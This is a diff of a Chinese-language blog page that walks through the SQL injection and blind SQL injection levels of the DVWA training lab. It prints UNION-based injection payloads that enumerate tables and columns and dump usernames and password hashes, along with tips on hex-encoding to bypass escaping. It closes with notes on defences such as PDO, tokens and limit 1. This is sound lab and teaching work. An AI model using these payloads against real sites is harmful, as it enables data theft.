@@ -227,38 +227,43 @@
             <h1 style="display: none">DVWA||SQL注入andSQL盲注</h1>
             
             <div class="markdown-body">
-              <h1 id="dvwa"><a href="#dvwa" class="headerlink" title="dvwa"></a>dvwa</h1><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>先挑熟悉的sql注入下手，单引号注入,报错：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;&#39; at line 1</code>推测为单引号注入，查看源代码:</p>
+              <h1>dvwa</h1>
+<h2 id="SQL-Injection"><a class="header-anchor" href="#SQL-Injection">🍭</a>SQL Injection</h2>
+<h4 id="low"><a class="header-anchor" href="#low">🍭</a>low</h4>
+<p>先挑熟悉的sql注入下手，单引号注入,报错：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin''' at line 1</code>推测为单引号注入，查看源代码:</p>
 <p><img src="/2021/01/22/dvwa/3.jpg" srcset="/img/loading.gif" alt="3"></p>
 <p>确定为单引号注入，源代码中用了<code>$_REQUEST获取id参数，$_REQUEST 包含了 $_GET，$_POST 和 $_COOKIE </code>的数组，没有进行过滤，开始查字段：</p>
-<p><code>1&#39; order by 2#</code>回显正常:</p>
+<p><code>1' order by 2#</code>回显正常:</p>
 <p><img src="/2021/01/22/dvwa/4.jpg" srcset="/img/loading.gif" alt="4"></p>
-<p><code> 1&#39; order by 3#</code>显示<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>故有两个字段，接下来查回显位置<code>1&#39; union select 1,2# </code>:</p>
+<p><code> 1' order by 3#</code>显示<code>Unknown column '3' in 'order clause'</code>故有两个字段，接下来查回显位置<code>1' union select 1,2# </code>:</p>
 <p><img src="/2021/01/22/dvwa/2.jpg" srcset="/img/loading.gif" alt="2"></p>
 <p>有两个显示位。</p>
 <p>查数据库:</p>
-<p><code>1&#39; union select 1,database()#</code></p>
+<p><code>1' union select 1,database()#</code></p>
 <p><img src="/2021/01/22/dvwa/5.jpg" srcset="/img/loading.gif" alt="5"></p>
 <p>查表:</p>
-<p><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>回显：<code>Illegal mix of collations for operation &#39;UNION&#39;</code>,百度的说法是字符集及数据表字段编码字符不一致导致的，不是很懂这条语句有什么编码问题，试试改为16进制读取：</p>
-<p><code>1&#39; union select 1,hex (group_concat(table_name) )from information_schema.tables where table_schema=database() #</code></p>
+<p><code>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>回显：<code>Illegal mix of collations for operation 'UNION'</code>,百度的说法是字符集及数据表字段编码字符不一致导致的，不是很懂这条语句有什么编码问题，试试改为16进制读取：</p>
+<p><code>1' union select 1,hex (group_concat(table_name) )from information_schema.tables where table_schema=database() #</code></p>
 <p><img src="/2021/01/22/dvwa/6.jpg" srcset="/img/loading.gif" alt="6"></p>
 <p><code>6775657374626F6F6B2C7573657273</code>hex解码后就是<code>guestbook,users</code></p>
 <p>查列：</p>
-<p><code>1&#39; union select 1,hex(group_concat(column_name)) from information_schema.columns where table_name=&#39;users&#39; #</code></p>
+<p><code>1' union select 1,hex(group_concat(column_name)) from information_schema.columns where table_name='users' #</code></p>
 <p><img src="/2021/01/22/dvwa/7.jpg" srcset="/img/loading.gif" alt="7"></p>
 <p>hex解码后为:<code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</code></p>
 <p>查数据:</p>
-<p><code>1&#39; union select user,password from users#</code>or<code>1&#39; union select 1,group_concat(user,0x3a,password) from users#</code>都可以</p>
+<p><code>1' union select user,password from users#</code>or<code>1' union select 1,group_concat(user,0x3a,password) from users#</code>都可以</p>
 <p><img src="/2021/01/22/dvwa/1.jpg" srcset="/img/loading.gif" alt="1"></p>
-<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p><img src="/2021/01/22/dvwa/8.jpg" srcset="/img/loading.gif" alt="8"></p>
+<h4 id="medium"><a class="header-anchor" href="#medium">🍭</a>medium</h4>
+<p><img src="/2021/01/22/dvwa/8.jpg" srcset="/img/loading.gif" alt="8"></p>
 <p>一打开就这样???去百度各种查，换PHP版本，改图示路径的代码……各种方法都试了，还是这个页面，又不想删掉重搭，然后就去虚拟机搭,虚拟机还不会用，搭个靶场搭了2小时……9(主要是找不到在虚拟机上用小皮面板搭dvwa的教程)各种报错，经历各种曲折终于搭好了</p>
 <p><img src="/2021/01/22/dvwa/9.jpg" srcset="/img/loading.gif" alt="9"></p>
 <p>本关不能输入语句，查看源码，是POST提交，且使用<code>mysqli_real_escape_string()</code>(前两个靶场碰到很多次了，不再介绍)过滤,本关是POST方法提交表单故可以抓包修改参数。步骤不再赘述，要注意<strong>单引号会被转义，遇到union语句有单引号的可利用进制转换进行绕过</strong>。</p>
-<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>打开是一个链接，点开跳转到一个session页面，查看源码并没有什么过滤</p>
+<h4 id="high"><a class="header-anchor" href="#high">🍭</a>high</h4>
+<p>打开是一个链接，点开跳转到一个session页面，查看源码并没有什么过滤</p>
 <img src="/2021/01/22/dvwa/10.jpg" srcset="/img/loading.gif" alt="10" style="zoom:50%;">
-
 <p>high源码中，在session输入的id也不做处理，就相当于low的sql……</p>
-<h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><p>查看源码</p>
+<h4 id="impossible"><a class="header-anchor" href="#impossible">🍭</a>impossible</h4>
+<p>查看源码</p>
 <p><img src="/2021/01/22/dvwa/11.jpg" srcset="/img/loading.gif" alt="11"></p>
 <p>防止CSRF攻击</p>
 <pre><code class="hljs pgsql">CSRF：跨站点请求伪造。CSRF攻击者在用户登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。
@@ -269,7 +274,6 @@ CSRF攻击是源于Web的隐式身份验证机制。Web的身份验证机制虽�
     加验证码
     Referer <span class="hljs-keyword">Check</span> 
     Anti CSRF Token</code></pre>
-
 <p>本关采用最后一种，至于<code>token</code>,在暴力破解的impossible等级我详细介绍过了。PS：貌似全面一点的防御都会用到<code>token</code></p>
 <p>Token一般用在两个地方:</p>
 <ul>
@@ -277,7 +281,6 @@ CSRF攻击是源于Web的隐式身份验证机制。Web的身份验证机制虽�
 <li>anti csrf攻击（跨站点请求伪造）：服务器端会对Token值进行验证，判断是否和session中的Token值相等。若相等，则可以证明请求有效，不是伪造的。</li>
 </ul>
 <pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">( <span class="hljs-variable">$data</span>-&gt;rowCount()</span></span> == <span class="hljs-number">1</span> ) <span class="hljs-comment">//限制了只允许返回一条数据</span></code></pre>
-
 <p><img src="/2021/01/22/dvwa/12.jpg" srcset="/img/loading.gif" alt="12"></p>
 <p>PDO可以防止sql注入</p>
 <ul>
@@ -285,20 +288,24 @@ CSRF攻击是源于Web的隐式身份验证机制。Web的身份验证机制虽�
 <li>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生SQL 注入。（然而，如果查询的其他部分是由未转义的输入来构建的，则仍存在 SQL 注入的风险）。</li>
 </ul>
 <p>详情见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/leezhxing/p/5282437.html">PDO防SQL注入原理分析</a></p>
-<h2 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>试探</p>
+<h2 id="SQL-Injection-v2"><a class="header-anchor" href="#SQL-Injection-v2">🍭</a>SQL Injection</h2>
+<h3 id="low-v2"><a class="header-anchor" href="#low-v2">🍭</a>low</h3>
+<p>试探</p>
 <p><img src="/2021/01/22/dvwa/13.jpg" srcset="/img/loading.gif" alt="13"></p>
 <p>单引号注入，没有任何过滤，思路讲过了，也可以用sqlmap跑。</p>
-<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>POST型，抓包，F12都可，</p>
+<h3 id="medium-v2"><a class="header-anchor" href="#medium-v2">🍭</a>medium</h3>
+<p>POST型，抓包，F12都可，</p>
 <p>源代码中用了<code>mysql_escape_string()</code>对单引号，双引号，反斜杠等过滤，碰到过滤的字符记得进制转换一下，步骤不再赘述。</p>
-<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>将操作页面和显示页面分开，将提交的值传递到显示页面的cookie字段中。</p>
+<h3 id="high-v2"><a class="header-anchor" href="#high-v2">🍭</a>high</h3>
+<p>将操作页面和显示页面分开，将提交的值传递到显示页面的cookie字段中。</p>
 <p>sql语句中增加了<code>limit 1</code>:限定了输出结果条数。</p>
 <pre><code class="hljs angelscript"><span class="hljs-comment">// Might sleep a random amount</span>
        <span class="hljs-keyword">if</span>( rand( <span class="hljs-number">0</span>, <span class="hljs-number">5</span> ) == <span class="hljs-number">3</span> ) &#123;
            sleep( rand( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );
        &#125;</code></pre>
-
 <p>随机执行sleep()函数，延迟的时间是随机在2-4s，这会时间盲注测试造成干扰，故本关可用布尔盲注。</p>
-<h3 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h3><p><code>is_numeric()</code>限制数字查询,<code>Anti-CSRF token</code>防御,<code>PDO</code>防SQL注入,sql语句的<code>limit 1</code>这些家伙又出现了，不赘述辽~~</p>
+<h3 id="impossible-v2"><a class="header-anchor" href="#impossible-v2">🍭</a>impossible</h3>
+<p><code>is_numeric()</code>限制数字查询,<code>Anti-CSRF token</code>防御,<code>PDO</code>防SQL注入,sql语句的<code>limit 1</code>这些家伙又出现了，不赘述辽~~</p>
 
             </div>
             <hr>
